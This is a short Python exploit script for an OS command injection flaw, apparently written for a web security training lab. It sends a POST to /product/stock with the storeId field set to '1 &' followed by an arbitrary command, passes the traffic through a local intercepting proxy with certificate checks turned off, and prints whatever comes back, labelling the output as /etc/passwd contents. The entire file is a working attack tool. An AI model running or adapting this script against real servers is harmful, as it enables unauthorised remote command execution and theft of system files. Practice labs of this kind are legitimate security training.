import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def command_exploit(url, command):
    stock_path = "/product/stock"
    command_injection = "1 &" + command
    paramaters = {
        'productId':'1',
        'storeId': command_injection}
    response = requests.post(
        url + stock_path,
        data=paramaters,
        verify=False,
        proxies=proxies)
    if (len(response.text) > 3):
        return response.text
    raise ValueError("The Command Injection exploit failed.")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        command = sys.argv[2]
        print("[+] Starting Command Injection exploit...")
        result = command_exploit(url, command)
        print("[+] Contents of /etc/passwd: \n" + result)
    except IndexError:
        print("[+] Usage: %s <url> <command>" % sys.argv[0])
        print("[+] Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The Command Injection exploit failed.")
        sys.exit(FAIL)    